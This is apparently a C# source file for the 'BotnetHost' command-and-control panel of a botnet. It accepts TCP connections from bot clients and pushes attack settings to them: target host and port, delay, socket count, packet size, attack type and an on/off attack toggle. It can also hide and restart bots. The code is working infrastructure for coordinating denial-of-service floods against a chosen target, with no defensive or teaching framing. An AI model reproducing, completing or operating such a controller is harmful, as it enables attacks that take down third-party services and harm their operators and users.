using System;
using System.Collections.Generic;
using System.Data;
using System.Linq;
using System.Net;
using System.Net.Sockets;
using System.Text;
using System.Windows.Forms;
using System.Threading;
using System.IO;
using System.Net.NetworkInformation;

namespace BotnetHost
{
    public partial class MainPanel : MetroFramework.Forms.MetroForm
    {
        // List of client sockets
        List<ClientConnection> clientConnections = new List<ClientConnection>();
        // Server Socket
        Socket serverSocket;
        // Server Thread
        Thread mainServerThread;
        // Server Info
        string serverIP = GetLocalIPAddress();
        string serverIPV4 = GetLocalIPv4(NetworkInterfaceType.Wireless80211);
        Int32 serverPort = 11111;
        // Action Variables
        Boolean runServer = false;
        string previousLogMessage = "";
        Boolean restartClients = false;
        Boolean hideClients = false;

        /// <summary>
        /// MainPanel Function, this is the constuctor for the window
        /// </summary>
        public MainPanel()
        {
            InitializeComponent();
            clientColumn.Width = clientListView.Width - 5;
            logColumn.Width = logListView.Width - 5;
            serverIPLabel.Text = "IP: " + serverIP;
            serverIPV4Label.Text = "IPV4: " + serverIPV4;
            serverPortLabel.Text = "Port: " + serverPort.ToString();
            log("Starting Host-Server...");
            runServer = true;
            mainServerThread = new Thread(() => serverSocketThread());
            mainServerThread.Start();
        }

        /// <summary>
        /// Client Socket Thread Function, this gets ran for every connected client
        /// </summary>
        /// <param name="clientGUID">GUID of ClientConnection that this thread is responsible for</param>
        public void clientSocketThread(string clientUID)
        {
            ClientConnection clientConnection = null;
            Boolean runThread = false;

            // Loop through client connections to find matching cliengGUID
            foreach (ClientConnection connection in clientConnections)
            {
                if (connection.uid.ToString() == clientUID)
                {
                    try
                    {
                        log("Client thread started for " + connection.clientName + "...");
                        // matching GUID found, this is our desired connection
                        clientConnection = connection;
                        runThread = true;
                    }
                    catch (Exception e) {}
                }
            }
            
            // Infinite loop while client is running
            while (runThread)
            {   
                try
                {
                    // Wait for incomming message from client
                    // CURRENTLY DISABLED BECAUSE WE DONT NEED IT, BUT IF CONTINUOUS COMMUNICATION IS NEEDED IN THE FUTURE, RE-ENABLE
                    while (false)
                    {
                        // Attempt to read incomming client message
                        try
                        {
                            // Data buffer 
                            byte[] bytes = new Byte[1024];
                            string data = null;
                            int numByte = clientConnection.clientSocket.Receive(bytes);
                            data += Encoding.ASCII.GetString(bytes, 0, numByte);
                            // Make sure message contains something
                            if (data.IndexOf("<EOF>") > -1)
                            {
                                log("Message recieved from " + clientConnection.clientName);
                                // Parse message for command handling
                                data = data.Replace("<EOF>", "");
                                if (data.Contains("["))
                                {
                                    log("Message: " + data);
                                    // Loop through client commands
                                    string[] messages = data.Split(',').Select(s => s.Trim().Substring(1, s.Length - 2)).ToArray();
                                    foreach (string item in messages)
                                    {
                                    }
                                }
                                break;
                            }
                        }
                        catch (Exception e) { } // no message recieved

                    }

                    // Send update message to client (if update is present)
                    if (clientConnection.hasUpdate)
                    {
                        // Build update message for client connection
                        log("Sending Client Update: " + clientConnection.buildUpdate(new string[0]));
                        byte[] message = Encoding.ASCII.GetBytes(clientConnection.buildUpdate(new string[0]));
                        // Send update message and reset necessary variables
                        clientConnection.clientSocket.Send(message);
                        clientConnection.restart = false;
                        clientConnection.hasUpdate = false;
                        updateClientPanel();
                    } else
                    {
                        // Ping clients (check that they are still connected)
                        byte[] message = Encoding.ASCII.GetBytes("ping!");
                        clientConnection.clientSocket.Send(message);
                    }


                    // Sleep thread to improve performance
                    Thread.Sleep(1000);
                } catch (Exception er)
                {
                    log(clientConnection.clientName + " has been disconnected...");
                    // Kill client
                    try
                    {
                        clientConnections.Remove(clientConnection);
                    }
                    catch (Exception e) { }
                    clientConnection.killClient();
                    updateClientPanel();
                    runThread = false;
                }
            }

            // Kill client
            try
            {
                clientConnection.killClient();
            } catch (Exception e) { }
            // Remove connection from list and refresh list
            try
            {
                clientConnections.Remove(clientConnection);
            }
            catch (Exception e) { }
            updateClientPanel();
        }

        /// <summary>
        /// Main Server Thread Function
        /// </summary>
        public void serverSocketThread()
        {
            // Clear connections from previous server sessions
            clientConnections.Clear();
            // Establish the local endpoint for the socket. Dns.GetHostName returns the name of the host running the application. 
            IPHostEntry ipHost = Dns.GetHostEntry(Dns.GetHostName());
            IPAddress ipAddr;
            try
            {
                // Try to set socket IP address to current IPV4 address (only works on wifi as of now)
                ipAddr = IPAddress.Parse(GetLocalIPv4(NetworkInterfaceType.Wireless80211));
            } catch (Exception e)
            {
                // Fail safe = grabbing some other ip address that only works when all clients are on same pc as host
                ipAddr = ipHost.AddressList[0];
            }

            IPEndPoint localEndPoint = new IPEndPoint(ipAddr, 11111);
            // Creation TCP/IP Socket using Socket Class Costructor 
            serverSocket = new Socket(ipAddr.AddressFamily, SocketType.Stream, ProtocolType.Tcp);
            try
            {
                // Using Bind() method we associate a network address to the Server Socket All client that will connect to this Server Socket must know this network Address 
                serverSocket.Bind(localEndPoint);
                log("Host-Server started on " + serverIPV4 + ":" + serverPort);
                // Using Listen() method we create the Client list that will want to connect to Server 
                log("Waiting for client(s) to connect...");
                serverSocket.Listen(10);
                while (runServer)
                {
                    try
                    {
                        // Suspend while waiting for incoming connection Using Accept() method the server will accept connection of client 
                        Socket clientSocket = serverSocket.Accept();
                        // Add client socket to list of all client sockets
                        string newUID = Guid.NewGuid().ToString();
                        log("Client connected: " + clientSocket.RemoteEndPoint.ToString() + " [" + newUID.ToString() + "]");
                        // Create New Client Thread with GUID as paramater for connection tracking
                        Thread newClientThread = new Thread(() => clientSocketThread(newUID.ToString()));
                        // Create new 'ClientConnection' Object to track/link client connection & add to master list
                        ClientConnection newClientConnection = new ClientConnection(newClientThread, clientSocket);
                        newClientConnection.uid = newUID;
                        clientConnections.Add(newClientConnection);
                        // Start new client thread
                        newClientThread.Start();
                        // Loop through client connections to check for dead sockets
                        foreach (ClientConnection connection in clientConnections)
                        {
                            try
                            {
                                // Attempt to ping each connection
                                byte[] message = Encoding.ASCII.GetBytes("ping!");
                                connection.clientSocket.Send(message);
                            } catch (Exception e)
                            {
                                // Ping failed (connection is probably dead, so we kill the client and remove it from the master list)
                                log("Connection with " + connection.clientName + " has been interrupted... killing client...");
                                connection.killClient();
                                clientConnections.Remove(connection);
                            }
                        }
                    } catch (Exception error){}
                    updateClientPanel();
                }
                // Stop Server (server toggle was disabled)
                log("Stopping Server...");
                stopServer();
            }
            catch (ThreadAbortException e){}
            catch (Exception e)
            {
                log("Something bad happened:" + e.ToString());
            }
        }

        /// <summary>
        /// log() function, used to display log messages to the user & write to log.txt
        /// </summary>
        /// <param name="logMessage">Message to be displayed to user</param>
        public void log(string logMessage)
        {
            // save raw message
            string raw = logMessage;
            // Build log message with date and message
            logMessage = "[" + DateTime.UtcNow + "] " + logMessage;
            // make sure we are not printing duplicate messages
            if (raw != previousLogMessage)
            {
                // Write to console in case of exception
                Console.WriteLine(logMessage);
                try
                {
                    // Create new listviewitem for the log message
                    ListViewItem newItem = new ListViewItem();
                    newItem.Text = logMessage;
                    // Use Invoke() to access the log listview from other threads (very big brain)
                    logListView.Invoke((MethodInvoker)delegate {
                        // Running on the UI thread
                        logListView.Items.Add(newItem);
                        logListView.Columns[0].Width = logListView.Width - 35;
                        logListView.EnsureVisible(logListView.Items.Count - 1);
                    });
                    previousLogMessage = raw;
                }
                catch (Exception e)
                {
                    // ughhhhhhhhhhhhh something broke
                    Console.WriteLine("HEY SILLY, THIS IS PREVENTING THE LOG FROM WORKING: " + e.ToString());
                }
                try
                {
                    File.AppendAllText("log.txt", logMessage + Environment.NewLine);
                }
                catch (Exception e)
                {
                    Console.WriteLine(e.ToString());
                }
            }
        }

        /// <summary>
        /// updateClientPanel(), used to keep an updated list of active clients
        /// </summary>
        public void updateClientPanel()
        {
            clientListView.Invoke((MethodInvoker)delegate {
                // Running on the UI thread
                clientListView.Items.Clear();
            });
            foreach (ClientConnection item in clientConnections)
            {
                try
                {
                    ListViewItem clientItem = new ListViewItem();
                    clientItem.Text = item.clientName;
                    if (item.hidden)
                    {
                        clientItem.Text += " [Hidden]";
                    }
                    // Add tile to main panel
                    clientListView.Invoke((MethodInvoker)delegate {
                        // Running on the UI thread
                        clientListView.Items.Add(clientItem);
                    });
                } catch (Exception e){}
            }
        }

        /// <summary>
        /// Catch-All for settings updates, causes server to send all clients updated settings
        /// </summary>
        /// <param name="sender">This is the control that sent the command</param>
        /// <param name="e">This is the event argument</param>
        public void settingsChanged(object sender, EventArgs e)
        {
            // Loop through client connections and apply settings
            foreach (ClientConnection clientConnection in clientConnections)
            {
                clientConnection.hostOrIP = metroTextBox1.Text;
                clientConnection.port = int.Parse(metroTextBox2.Text);
                clientConnection.delay = delayTrackBar.Value;
                clientConnection.sockets = socketsTrackBar.Value;
                clientConnection.packetSize = packetSizeTrackBar.Value;
                clientConnection.attack = attackingToggle.Checked;
                if (attackTypeComboBox.Text == "")
                {
                    clientConnection.type = attackTypeComboBox.PromptText;
                } else if (attackTypeComboBox.Text != "")
                {
                    clientConnection.type = attackTypeComboBox.Text;
                }
                if (!clientConnection.restart)
                {
                    clientConnection.restart = restartClients;
                }
                clientConnection.hasUpdate = true;
                clientConnection.hidden = hideClients;
            }
        }

        /// <summary>
        /// Updates labels associated with track bars
        /// </summary>
        /// <param name="sender"></param>
        /// <param name="e"></param>
        public void updateTrackBars(object sender, EventArgs e)
        {
            delayLabel.Text = delayTrackBar.Value.ToString();
            socketsLabel.Text = socketsTrackBar.Value.ToString();
            packetSizeLabel.Text = packetSizeTrackBar.Value.ToString();
        }

        /// <summary>
        /// Stop the server
        /// </summary>
        public void stopServer()
        {
            // Toggle server switch
            serverToggle.Invoke((MethodInvoker)delegate {
                // Running on the UI thread
                serverToggle.Checked = false;
            });
            log("Stopping Server...");
            // Disable boolean for server thread (force close)
            runServer = false;
            // Close server socket and abort thread
            try
            {
                serverSocket.Shutdown(SocketShutdown.Both);
            }
            catch (Exception e)
            {
                Console.WriteLine("Error shutting down server socket: " + e.ToString());
            }
            try
            {
                serverSocket.Close();
            }
            catch (Exception e)
            {
                Console.WriteLine("Error closing server socket: " + e.ToString());
            }
            try
            {
                mainServerThread.Abort();
            }
            catch (ThreadAbortException e)
            {
                log("Server Thread has been aborted/stopped");
            }
            log("Server Stopped");
        }

        /// <summary>
        /// Start the server
        /// </summary>
        public void startServer()
        {
            log("Starting Server...");
            // Enable boolean for server thread
            runServer = true;
            // start new server thread
            mainServerThread = new Thread(() => serverSocketThread());
            mainServerThread.Start();
        }

        /// <summary>
        /// Toggle box for starting/stopping the server
        /// </summary>
        /// <param name="sender">The button</param>
        /// <param name="e">event args</param>
        private void serverToggle_CheckedChanged(object sender, EventArgs e)
        {
            if (serverToggle.Checked)
            {
                startServer();
            }
            else
            {
                stopServer();
            }
        }

        /// <summary>
        /// Closing Procedure, cleans up all connections/threads/sockets
        /// </summary>
        /// <param name="sender"></param>
        /// <param name="e"></param>
        private void MainPanel_FormClosing(object sender, FormClosingEventArgs e)
        {
            // Kill all client connections
            foreach (ClientConnection connection in clientConnections)
            {
                connection.killClient();
            }
            // Shutdown & Close Server Socket
            try
            {
                serverSocket.Shutdown(SocketShutdown.Both);
            }
            catch (Exception er) { }
            try
            {
                serverSocket.Close();
            }
            catch (Exception er) { }
            // Abort main thread
            try
            {
                mainServerThread.Abort();
            }
            catch (Exception er) { }
        }

        /// <summary>
        /// Restart client button
        /// </summary>
        /// <param name="sender"></param>
        /// <param name="e"></param>
        private void restartClientsBtn_Click(object sender, EventArgs e)
        {
            restartClients = true;
            settingsChanged(sender, e);
            clientConnections.Clear();
            updateClientPanel();
            restartClients = false;
        }

        /// <summary>
        /// Gets current IP address
        /// </summary>
        /// <returns></returns>
        public static string GetLocalIPAddress()
        {
            var host = Dns.GetHostEntry(Dns.GetHostName());
            foreach (var ip in host.AddressList)
            {
                if (ip.AddressFamily == AddressFamily.InterNetwork)
                {
                    return ip.ToString();
                }
            }
            throw new Exception("No network adapters with an IPv4 address in the system!");
        }

        /// <summary>
        /// Gets current IPV4 address
        /// </summary>
        /// <param name="_type"></param>
        /// <returns></returns>
        public static string GetLocalIPv4(NetworkInterfaceType _type)
        {
            string output = "";
            foreach (NetworkInterface item in NetworkInterface.GetAllNetworkInterfaces())
            {
                if (item.NetworkInterfaceType == _type && item.OperationalStatus == OperationalStatus.Up)
                {
                    foreach (UnicastIPAddressInformation ip in item.GetIPProperties().UnicastAddresses)
                    {
                        if (ip.Address.AddressFamily == AddressFamily.InterNetwork)
                        {
                            output = ip.Address.ToString();
                        }
                    }
                }
            }
            return output;
        }

        /// <summary>
        /// Click log context menu item resulting in message box displaying full message (usefull if errors get cutoff)
        /// </summary>
        /// <param name="sender"></param>
        /// <param name="e"></param>
        private void viewLogMenuItem_Click(object sender, EventArgs e)
        {
            if (logListView.SelectedItems[0] != null)
            {
                MessageBox.Show(logListView.SelectedItems[0].Text, "Log Message");
            }
        }

        /// <summary>
        /// MouseDown event for log listview
        /// </summary>
        /// <param name="sender"></param>
        /// <param name="e"></param>
        private void activityLogListView_MouseDown(object sender, MouseEventArgs e)
        {
            if (e.Button == MouseButtons.Right)
            {
                var focusedItem = logListView.FocusedItem;
                if (focusedItem != null && focusedItem.Bounds.Contains(e.Location))
                {
                    logContextMenu.Show(Cursor.Position);
                }
            }
        }

        /// <summary>
        /// Disconnect the selected client from the Host-Server
        /// </summary>
        /// <param name="sender"></param>
        /// <param name="e"></param>
        private void disconnectToolStripMenuItem_Click(object sender, EventArgs e)
        {
            if (clientListView.SelectedItems[0] != null)
            {
                string selectedClientName = clientListView.SelectedItems[0].Text;

                foreach (ClientConnection connection in clientConnections)
                {
                    if (connection.clientName == selectedClientName)
                    {
                        connection.killClient();
                    }
                }
            }
        }

        /// <summary>
        /// MouseDown catcher for client list view (used for cotext menu)
        /// </summary>
        /// <param name="sender"></param>
        /// <param name="e"></param>
        private void clientListView_MouseDown(object sender, MouseEventArgs e)
        {
            if (e.Button == MouseButtons.Right)
            {
                var focusedItem = clientListView.FocusedItem;
                if (focusedItem != null && focusedItem.Bounds.Contains(e.Location))
                {
                    clientContextMenu.Show(Cursor.Position);
                }
            }
        }

        /// <summary>
        /// Restart the selected client
        /// </summary>
        /// <param name="sender"></param>
        /// <param name="e"></param>
        private void restartToolStripMenuItem_Click(object sender, EventArgs e)
        {
            if (clientListView.SelectedItems[0] != null)
            {
                string selectedClientName = clientListView.SelectedItems[0].Text;

                foreach (ClientConnection connection in clientConnections)
                {
                    if (connection.clientName == selectedClientName)
                    {
                        connection.restart = true;
                        connection.hasUpdate = true;
                        settingsChanged(sender, e);
                        updateClientPanel();
                    }
                }
            }
        }

        /// <summary>
        /// Toggle Visible/Hidden for all clients
        /// </summary>
        /// <param name="sender"></param>
        /// <param name="e"></param>
        private void hideClientsBtn_Click(object sender, EventArgs e)
        {
            if (hideClientsBtn.Text == "Hide Clients")
            {
                hideClients = true;
                settingsChanged(sender, e);
                hideClientsBtn.Text = "Show Clients";
            } else if (hideClientsBtn.Text == "Show Clients")
            {
                hideClients = false;
                settingsChanged(sender, e);
                hideClientsBtn.Text = "Hide Clients";
            }
        }

        /// <summary>
        /// Toggle Visible/Hidden for the selected client
        /// </summary>
        /// <param name="sender"></param>
        /// <param name="e"></param>
        private void hideToolStripMenuItem_Click(object sender, EventArgs e)
        {
            if (clientListView.SelectedItems[0] != null)
            {
                string selectedClientName = clientListView.SelectedItems[0].Text;
                try
                {
                    // remove ' [Hidden]' from selected client text (otherwise client will not be found in foreach loop)
                    selectedClientName = selectedClientName.Replace(" [Hidden]", "");
                }
                catch (Exception er) { }

                foreach (ClientConnection connection in clientConnections)
                {
                    if (connection.clientName == selectedClientName)
                    {
                        if (connection.hidden)
                        {
                            log("Client is hidden");
                            connection.hidden = false;
                            connection.hasUpdate = true;
                            updateClientPanel();
                        } else
                        {
                            log("Client is visible");
                            connection.hidden = true;
                            connection.hasUpdate = true;
                            updateClientPanel();
                        }
                    }
                }
            }
        }
    }
}
